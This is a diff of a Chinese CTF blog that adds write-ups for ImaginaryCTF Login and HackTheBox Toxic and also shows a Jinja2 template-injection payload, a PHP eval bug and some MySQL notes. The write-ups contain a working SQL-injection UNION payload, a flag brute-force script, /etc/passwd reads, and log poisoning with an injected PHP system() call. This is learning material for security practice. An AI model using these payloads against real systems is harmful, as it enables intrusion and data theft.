+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line">from PIL import Image, ImageDraw</span><br><span class="line"></span><br><span class="line">def create_flag_image(filename):</span><br><span class="line">    img = Image.new(&#x27;RGBA&#x27;, (690, 420), color=(255, 255, 255, 255))</span><br><span class="line">    draw = ImageDraw.Draw(img)</span><br><span class="line">    draw.point((412, 309), fill=(52, 146, 235, 123))</span><br><span class="line">    draw.point((12, 209), fill=(42, 16, 125, 231))</span><br><span class="line">    draw.point((264, 143), fill=(122, 136, 25, 213))</span><br><span class="line">    img.save(filename)</span><br><span class="line"></span><br><span class="line">def set_image_metadata(image_path):</span><br><span class="line">    metadata = &#123;</span><br><span class="line">        &quot;PNG:Description&quot;: &quot;jctf&#123;not_the_flag&#125;&quot;,</span><br><span class="line">        &quot;PNG:Title&quot;: &quot;kool_pic&quot;,</span><br><span class="line">        &quot;PNG:Author&quot;: &quot;anon&quot;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    command = [&quot;exiftool&quot;, &quot;-overwrite_original&quot;]</span><br><span class="line">    for tag, value in metadata.items():</span><br><span class="line">        command.append(f&quot;-&#123;tag&#125;=&#123;value&#125;&quot;)</span><br><span class="line">    command.append(image_path)</span><br><span class="line"></span><br><span class="line">    subprocess.run(command, capture_output=True, text=True)</span><br><span class="line"></span><br><span class="line">def view_image_metadata(image_path):</span><br><span class="line">    command = [&quot;exiftool&quot;, image_path]</span><br><span class="line">    result = subprocess.run(command, capture_output=True, text=True)</span><br><span class="line"></span><br><span class="line">    if result.returncode == 0:</span><br><span class="line">        print(&quot;Metadata for image: &quot;, image_path)</span><br><span class="line">        print(result.stdout)</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;Error:&quot;, result.stderr)</span><br><span class="line"></span><br><span class="line">img_filename = &quot;flag.png&quot;</span><br><span class="line">created_filename = create_flag_image(img_filename)</span><br><span class="line">set_image_metadata(img_filename)</span><br><span class="line">view_image_metadata(img_filename)</span><br></pre></td></tr></table></figure>
+<h3 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h3><p>按下F12查看原码<br>瞎了没看到source几个大字<br>还是sqlite3</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (isset($_GET[&#x27;source&#x27;])) &#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$flag = $_ENV[&#x27;FLAG&#x27;] ?? &#x27;jctf&#123;test_flag&#125;&#x27;; #如果无法从环境变量中获取到FLAG，那么就把后</span><br><span class="line">面的那个赋值给$flag</span><br><span class="line">$magic = $_ENV[&#x27;MAGIC&#x27;] ?? &#x27;aabbccdd11223344&#x27;;</span><br><span class="line">$db = new SQLite3(&#x27;/db.sqlite3&#x27;);</span><br><span class="line"></span><br><span class="line">$username = $_POST[&#x27;username&#x27;] ?? &#x27;&#x27;;</span><br><span class="line">$password = $_POST[&#x27;password&#x27;] ?? &#x27;&#x27;;</span><br><span class="line">$msg = &#x27;&#x27;;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[$magic])) &#123;</span><br><span class="line">    $password .= $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($username &amp;&amp; $password) &#123;</span><br><span class="line">    $res = $db-&gt;querySingle(&quot;SELECT username, pwhash FROM users WHERE username =&#x27;$username&#x27;&quot;, true);</span><br><span class="line">    if (!$res) &#123;</span><br><span class="line">        $msg = &quot;Invalid username or password&quot;;</span><br><span class="line">    &#125; else if (password_verify($password, $res[&#x27;pwhash&#x27;])) &#123;</span><br><span class="line">        $u = htmlentities($res[&#x27;username&#x27;]);</span><br><span class="line">        $msg = &quot;Welcome $u! But there is no flag here :P&quot;;</span><br><span class="line">        if ($res[&#x27;username&#x27;] === &#x27;admin&#x27;) &#123;</span><br><span class="line">            $msg .= &quot;&lt;!-- magic: $magic --&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = &quot;Invalid username or password&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">...</span><br><span class="line">有个&lt;?= $msg ?&gt;</span><br></pre></td></tr></table></figure>
+<p>另一部分：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//echo password_hash(&quot;a&quot;, PASSWORD_DEFAULT);</span><br><span class="line">echo</span><br><span class="line">password_verify(&quot;a&quot;,&quot;$2y$10$5OlXnb0eEfoadvdCwULWvuKVU3HFUL7bElISRItRVbDySKxrHMiC</span><br><span class="line">O&quot;)</span><br><span class="line">?&gt;</span><br><span class="line"># 判断变量$password的hash值是否等于第二个参数(存入数据库当中的经哈希处理后的字符串)，使用PASSWORD_BCRYPY算法加密，被加密字符串最多长72个字节</span><br></pre></td></tr></table></figure>
+<p>1.得到magic，使得password带上flag<br>2.通过对username的注入登录到admin，获取到magic<code>688a35c685a7a654abc80f8e123ad9f0</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">password=a&amp;username=a&#x27; UNION SELECT &#x27;admin&#x27; AS</span><br><span class="line">username,&#x27;$2y$10$5OlXnb0eEfoadvdCwULWvuKVU3HFUL7bElISRItRVbDySKxrHMiCO&#x27; AS</span><br><span class="line">pwhash/*</span><br></pre></td></tr></table></figure>
+<p>由于只判断前72个字符，可进行爆破<br>脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">url = &quot;http://login.chal.imaginaryctf.org/?688a35c685a7a654abc80f8e123ad9f0&quot;</span><br><span class="line"></span><br><span class="line">able =</span><br><span class="line">&quot;abcdefghijklmnopqrstuvwxyz_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!\&quot;#$%&amp;&#x27;()*+,-./</span><br><span class="line">:;&lt;=&gt;?@[\]^`&#123;|~&#125;&quot;</span><br><span class="line">flag = &quot;ictf&#123;&quot;</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    length = 71 - len(flag)</span><br><span class="line">    password = &quot;a&quot; * length</span><br><span class="line">    for i in able:</span><br><span class="line">        guess = password + flag + i</span><br><span class="line">        hash = os.popen(f&quot;php exp.php &#123;guess&#125;&quot;).read()</span><br><span class="line">        headers = &#123;&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;&#125; # need</span><br><span class="line">for it</span><br><span class="line">        data = f&quot;username=a&#x27; UNION SELECT &#x27;admin&#x27; AS username,&#x27;&#123;hash&#125;&#x27; AS pwhash/*&amp;password=&#123;password&#125;&quot;</span><br><span class="line">        r = requests.post(url, data=data, headers=headers)</span><br><span class="line">        if &quot;admin&quot; in r.text:</span><br><span class="line">            flag += i</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br><span class="line">        if flag[-1:] == &#x27;&#125;&#x27;:</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+<p>输出结果：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo password_hash($argv[1], PASSWORD_DEFAULT);</span><br></pre></td></tr></table></figure>
       
     </div>
     <footer class="article-footer">
@@ -232,7 +594,8 @@
         <p>Challenges-&gt;active challenges</p>
 <h2 id="Templated"><a href="#Templated" class="headerlink" title="Templated"></a>Templated</h2><p>非常简单的Flask/jinja2模板注入</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in &#x27;&#x27;.__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;</span><br><span class="line">&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag.txt&#x27;).read()&quot;)&#125;&#125;</span><br><span class="line">&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
-<p>啥过滤也没有，唯一难点估计是一眼看过去不知道注入点在哪，F12啥也没有<br>没写出来，没啥头绪<br>··············分割线·······················<br>进入靶机注意到这是个登录界面，尝试单双引号测试，显示登录失败，注意到url后?message提供错误信息，可以在url中修改改变红框内的报错信息，但没啥用。下面有个蓝色框的贴士<br>输入“\”页面无法连接，输入“*”进入搜索界面，输入1得到用户信息，然后卡了<br>··············分割线·······················<br>writeup:<a target="_blank" rel="noopener" href="https://blog.csdn.net/galaxy3000/article/details/122975302?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169052768016800184190415%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169052768016800184190415&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-122975302-null-null.142%5Ev91%5Ekoosearch_v1,239%5Ev3%5Einsert_chatgpt&amp;utm_term=hackthebox%20phonebook&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/galaxy3000/article/details/122975302?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169052768016800184190415%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169052768016800184190415&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-122975302-null-null.142^v91^koosearch_v1,239^v3^insert_chatgpt&amp;utm_term=hackthebox%20phonebook&amp;spm=1018.2226.3001.4187</a></p>
+<p>啥过滤也没有，唯一难点估计是一眼看过去不知道注入点在哪，F12啥也没有</p>
+<h2 id="Phonebook"><a href="#Phonebook" class="headerlink" title="Phonebook"></a>Phonebook</h2><p>没写出来，没啥头绪<br>··············分割线·······················<br>进入靶机注意到这是个登录界面，尝试单双引号测试，显示登录失败，注意到url后?message提供错误信息，可以在url中修改改变红框内的报错信息，但没啥用。下面有个蓝色框的贴士<br>输入“\”页面无法连接，输入“*”进入搜索界面，输入1得到用户信息，然后卡了<br>··············分割线·······················<br>writeup:<a target="_blank" rel="noopener" href="https://blog.csdn.net/galaxy3000/article/details/122975302?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169052768016800184190415%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169052768016800184190415&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-122975302-null-null.142%5Ev91%5Ekoosearch_v1,239%5Ev3%5Einsert_chatgpt&amp;utm_term=hackthebox%20phonebook&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/galaxy3000/article/details/122975302?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169052768016800184190415%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169052768016800184190415&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-122975302-null-null.142^v91^koosearch_v1,239^v3^insert_chatgpt&amp;utm_term=hackthebox%20phonebook&amp;spm=1018.2226.3001.4187</a></p>
 <p>查看wp发现是模糊测试<br>这是啥？<br>通过向目标系统提供非预期的输入并监视异常结果来发现软件漏洞，用随机坏数据（也称做 fuzz）攻击一个程序，然后等着观察哪里遭到了破坏。模糊测试的技巧在于，将尽可能多的杂乱数据投入程序中。</p>
 <p>解题需要找出管理员密码，而登陆前的贴士告诉了管理员是谁，查找得管理员username为reese<br>接下来需要写脚本暴力破解，时间较久，但网络不太行出不来</p>
 <h2 id="Weather-APP"><a href="#Weather-APP" class="headerlink" title="Weather APP"></a>Weather APP</h2><p>服务端请求伪造加SQL密码更新<br>··············分割线·······················<br>index.js可以看到：</p>
@@ -248,6 +611,11 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class TimeModel</span><br><span class="line">&#123;</span><br><span class="line">    public function __construct($format)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;format = addslashes($format);</span><br><span class="line"></span><br><span class="line">        [ $d, $h, $m, $s ] = [ rand(1, 6), rand(1, 23), rand(1, 59), rand(1, 69) ];</span><br><span class="line">        $this-&gt;prediction = &quot;+$&#123;d&#125; day +$&#123;h&#125; hour +$&#123;m&#125; minute +$&#123;s&#125; second&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getTime()</span><br><span class="line">    &#123;</span><br><span class="line">        eval(&#x27;$time = date(&quot;&#x27; . $this-&gt;format . &#x27;&quot;, strtotime(&quot;&#x27; . $this-&gt;prediction . &#x27;&quot;));&#x27;);</span><br><span class="line">        return isset($time) ? $time : &#x27;Something went terribly wrong&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>对输入（format）只有简单的过滤就把它放出来了<br>··············分割线·······················<br>wp:<a target="_blank" rel="noopener" href="https://shakuganz.com/2021/06/23/hackthebox-lovetok-write-up/">https://shakuganz.com/2021/06/23/hackthebox-lovetok-write-up/</a></p>
 <h2 id="一点反思"><a href="#一点反思" class="headerlink" title="一点反思"></a>一点反思</h2><p>Weather App和LoveTok的题目都有不少文件，大部分没啥用，能在这些东西中找到能用的漏洞才能有突破口<br>LoveTok中接受了$_SERVER变量，但好像没啥用，可以算一个干扰吧<br>耐心看完题目逻辑才能知道大概干啥，以及多看看，不然都不知道题目想干啥</p>
+<h2 id="Toxic"><a href="#Toxic" class="headerlink" title="Toxic"></a>Toxic</h2><p>下载源码，一眼php反序列化，但写之后其实算命令注入+文件包含<br>··············分割线·······················<br>index.php:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">spl_autoload_register(function ($name)&#123;</span><br><span class="line">    if (preg_match(&#x27;/Model$/&#x27;, $name))</span><br><span class="line">    &#123;</span><br><span class="line">        $name = &quot;models/$&#123;name&#125;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    include_once &quot;$&#123;name&#125;.php&quot;;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">if (empty($_COOKIE[&#x27;PHPSESSID&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    $page = new PageModel;</span><br><span class="line">    $page-&gt;file = &#x27;/www/index.html&#x27;;</span><br><span class="line"></span><br><span class="line">    setcookie(</span><br><span class="line">        &#x27;PHPSESSID&#x27;, </span><br><span class="line">        base64_encode(serialize($page)), </span><br><span class="line">        time()+60*60*24, </span><br><span class="line">        &#x27;/&#x27;</span><br><span class="line">    );</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">$cookie = base64_decode($_COOKIE[&#x27;PHPSESSID&#x27;]);</span><br><span class="line">unserialize($cookie);</span><br></pre></td></tr></table></figure>
+<p>PageModel.php:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class PageModel</span><br><span class="line">&#123;</span><br><span class="line">    public $file;</span><br><span class="line"></span><br><span class="line">    public function __destruct() </span><br><span class="line">    &#123;</span><br><span class="line">        include($this-&gt;file);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>由源码可知，在页面刷新会发送Cookie，内容会将要打开的文件序列化后再base64加密，无过滤<br>1.对Cookie解码，修改读取文件为“/etc/passwd”<br>2.发现用户nginx，修改读取文件“/var/log/nginx/access.log”读取日志文件<br>3.发现日志文件用户记录请求头信息（User-Agent），修改为<code>&lt;?php system(&#39;ls /&#39;); ?&gt;</code>注入命令<br>4.发现flag文件，再次修改请求头注入读取flag的命令即可<br>··············分割线·······················<br>wp:<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40952713/article/details/119795157">https://blog.csdn.net/qq_40952713/article/details/119795157</a></p>
 
       
     </div>
@@ -444,307 +812,6 @@
 
 
   
-    <article id="post-week1" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2023/07/13/week1/" class="article-date">
-  <time datetime="2023-07-13T14:50:14.000Z" itemprop="datePublished">2023-07-13</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2023/07/13/week1/">2023/07/10：夏令营week1记录:mysql笔记</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="MySQL课堂笔记"><a href="#MySQL课堂笔记" class="headerlink" title="MySQL课堂笔记"></a>MySQL课堂笔记</h1><h2 id="0-标题暂定"><a href="#0-标题暂定" class="headerlink" title="0.标题暂定"></a>0.标题暂定</h2><h3 id="关于语句大小写"><a href="#关于语句大小写" class="headerlink" title="关于语句大小写"></a>关于语句大小写</h3><p>MySQL 在 windows 下是不区分大小写的，将 script 文件导入 MySQL 后表名也会自动转化为小写，结果再 想要将数据库导出放到 linux 服<br>务器中使用时就出错了。因为在 linux 下表名区分大小写而找不到表，查了很多都是说在 linux 下更改 MySQL 的设置使其也不区分大小写，但是<br>有没有办法反过来让 windows 下大小写敏感呢。其实方法是一样的，相应的更改 windows 中 MySQL 的设置就行了。</p>
-<p>具体操作：<br>在 MySQL 的配置文件 my.ini 中增加一行：<br>lower_case_table_names = 0<br>其中 0：区分大小写，1：不区分大小写<br>MySQL 在 Linux 下数据库名、表名、列名、别名大小写规则是这样的：<br> 1、数据库名与表名是严格区分大小写的；<br> 2、表的别名是严格区分大小写的；<br> 3、列名与列的别名在所有的情况下均是忽略大小写的；<br> 4、变量名也是严格区分大小写的； MySQL 在 Windows 下都不区分大小写</p>
-<h3 id="使用source-地址显示“Failed-to-open-file-‘…’-error-2”的可能原因"><a href="#使用source-地址显示“Failed-to-open-file-‘…’-error-2”的可能原因" class="headerlink" title="使用source + 地址显示“Failed to open file ‘…’, error: 2”的可能原因"></a>使用source + 地址显示“Failed to open file ‘…’, error: 2”的可能原因</h3><p>1.未先创建并”use”数据库；<br>2.在windows中，路径不能包含空格，中文字符，需使用“/”连接路径，且最好选择绝对路径；不可使用“.”以及“&lt;”和“&gt;”<br>3.该语句结尾不需分号<br>原文<a target="_blank" rel="noopener" href="https://sebhastian.com/mysql-failed-to-open-file-error-2/">https://sebhastian.com/mysql-failed-to-open-file-error-2/</a><br><a target="_blank" rel="noopener" href="https://philip.yurchuk.com/software/mysql-failed-to-open-file-error-2-and-22-on-windows/">https://philip.yurchuk.com/software/mysql-failed-to-open-file-error-2-and-22-on-windows/</a></p>
-<h2 id="1-查看MYSQL版本"><a href="#1-查看MYSQL版本" class="headerlink" title="1.查看MYSQL版本"></a>1.查看MYSQL版本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ mysql --version</span><br><span class="line">$ mysql -V</span><br></pre></td></tr></table></figure>
-<h2 id="2-创建及使用"><a href="#2-创建及使用" class="headerlink" title="2.创建及使用"></a>2.创建及使用</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ create database/table [name]</span><br><span class="line">$ use [name]</span><br></pre></td></tr></table></figure>
-<h2 id="3-查询使用的数据库"><a href="#3-查询使用的数据库" class="headerlink" title="3.查询使用的数据库"></a>3.查询使用的数据库</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ select database()</span><br></pre></td></tr></table></figure>
-<h2 id="4-查询数据库版本"><a href="#4-查询数据库版本" class="headerlink" title="4.查询数据库版本"></a>4.查询数据库版本</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ select version()</span><br></pre></td></tr></table></figure>
-<h2 id="5-终止输入语句"><a href="#5-终止输入语句" class="headerlink" title="5.终止输入语句"></a>5.终止输入语句</h2><p>键入 \c</p>
-<h2 id="6-退出mysql"><a href="#6-退出mysql" class="headerlink" title="6.退出mysql"></a>6.退出mysql</h2><p>\q QUIT\EXIT<br>也可CTRL+C</p>
-<h2 id="7-导入数据库"><a href="#7-导入数据库" class="headerlink" title="7.导入数据库"></a>7.导入数据库</h2><p>（创建并使用数据库后）</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">source</span> [文件路径]（无需;）</span><br></pre></td></tr></table></figure>
-<h2 id="8-查看"><a href="#8-查看" class="headerlink" title="8.查看"></a>8.查看</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ 表的结构 desc [table name]</span><br><span class="line">$ 数据库 show databases</span><br><span class="line">$ 查看表创建语句 show create table [table name]</span><br></pre></td></tr></table></figure>
-<h2 id="9-简单查询"><a href="#9-简单查询" class="headerlink" title="9.简单查询"></a>9.简单查询</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ select [column name],[column name] from [table name]</span><br><span class="line">$ select * from [table name]</span><br></pre></td></tr></table></figure>
-<h2 id="10-别名"><a href="#10-别名" class="headerlink" title="10.别名"></a>10.别名</h2><p>可以采用 as 关键字重命名表字段，其实 as 也可以省略，如：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ select empno <span class="string">&quot;员工编号&quot;</span>, ename <span class="string">&quot;员工姓名&quot;</span>, sal*12 （as）<span class="string">&quot;年薪&quot;</span> from emp</span><br></pre></td></tr></table></figure>
-<h2 id="11-条件查询"><a href="#11-条件查询" class="headerlink" title="11.条件查询"></a>11.条件查询</h2><p>条件查询需要用到 where 语句，where 必须放到 from 语句表的后面<br>支持如下运算符<br>运算符             说明<br>=                  等于<br>&lt;&gt;或!=             不等于<br>&lt;                  小于<br>&lt;=                 小于等于<br>&gt;                 大于<br>&gt;=                 大于等于<br>between …and …. 两个值之间,等同于 &gt;= and &lt;=<br>is null         为 null（is not null 不为空）<br>and             并且<br>or                 或者<br>in                 包含，相当于多个 or（not in 不在这个范围中）如:select * from emp where job in (‘manager’,’salesman’);<br>not not            可以取非，主要用在 is 或 in 中<br>like             like称为模糊查询，支持%或下划线匹配<br>                %匹配任意个字符<br>                下划线，一个下划线只匹配一个字符<br>                例如：select * from emp where ename like ‘_A%’;</p>
-<h2 id="12-排序"><a href="#12-排序" class="headerlink" title="12.排序"></a>12.排序</h2><p>排序采用 order by 子句，order by 后面跟上排序字段，排序字段可以放多个，多个采用逗号间隔，order by 默认采用升<br>序，如果存在 where 子句那么 order by 必须放到 where 语句的后面</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ 升序：order by [column name] asc</span><br><span class="line">$ 降序：order by [column name] desc</span><br></pre></td></tr></table></figure>
-<h2 id="13-数据处理函数-单行处理函数"><a href="#13-数据处理函数-单行处理函数" class="headerlink" title="13.数据处理函数/单行处理函数"></a>13.数据处理函数/单行处理函数</h2><p>Lower         转换小写<br>upper         转换大写 如：upper(‘manager’)<br>substr        取子串（substr(被截取的字符串//[table name],起始下标,截取的长度)）<br>length           取长度 如：length([table name])<br>trim          去空格<br>str_to_date   将字符串转换成日期<br>                   如：select * from emp where HIREDATE=’1981-02-20’；<br>                （第二种方法，将字符串转换成 date 类型）<br>                select * from emp where HIREDATE=str_to_date(‘1981-02-20’,’%Y-%m-%d’);<br>                select * from emp where HIREDATE=str_to_date(‘02-20-1981’,’%m-%d-%Y’);<br>date_format   格式化日期 如：select empno, ename, date_format(hiredate, ‘%Y-%m-%d %H:%i:%s’) as hiredate from emp<br>format        设置千分位 如：select empno, ename, Format(sal, 0) from emp;<br>round         四舍五入  round(123.123)<br>rand()        生成随机数<br>Ifnull        可以将 null 转换成一个具体值<br>                如：ifnull(comm,0)<br>                  当comm为null替换为0</p>
-<h2 id="14-日期格式"><a href="#14-日期格式" class="headerlink" title="14.日期格式"></a>14.日期格式</h2><p>now() 获得当前时间</p>
-<h3 id="格式的说明"><a href="#格式的说明" class="headerlink" title="格式的说明"></a>格式的说明</h3><p>%Y：代表 4 位的年份<br>%y：代表 2 位的年份<br>%m：代表月, 格式为(01……12)<br>%c：代表月, 格式为(1……12)<br>%H：代表小时,格式为(00……23)<br>%h：代表小时,格式为(01……12)<br>%i：代表分钟, 格式为(00……59)<br>%r：代表 时间,格式为 12 小时(hh:mm:ss [AP]M)<br>%T：代表 时间,格式为 24 小时(hh:mm:ss)<br>%S：代表 秒,格式为(00……59)<br>%s：代表 秒,格式为(00……59)</p>
-<h2 id="15-case-…-when-…-then-…-else-…end"><a href="#15-case-…-when-…-then-…-else-…end" class="headerlink" title="15.case … when … then …..else …end"></a>15.case … when … then …..else …end</h2><p>例如：<br>如果 job 为 MANAGERG 薪水上涨 10%,如果 job 为 SALESMAN 工资上涨 50%<br> select empno, ename, job, sal, case job when ‘MANAGER’ then sal<em>1.1 when ‘SALESMAN’ then sal</em>1.5 end as newsal from emp;</p>
-<h2 id="16-分组函数-聚合函数-多行处理函数"><a href="#16-分组函数-聚合函数-多行处理函数" class="headerlink" title="16.分组函数/聚合函数/多行处理函数"></a>16.分组函数/聚合函数/多行处理函数</h2><p>未进行分组时整张表默认为一组<br>count      取得记录数   例如:count([table name]或*) *为一整行一个数据，这里相当于统计行数<br>sum        求和     注意：当例如select sum(sal+comm) from emp中comm中出现null,需替换null<br>avg        取平均<br>max        取最大的数<br>min        取最小的数</p>
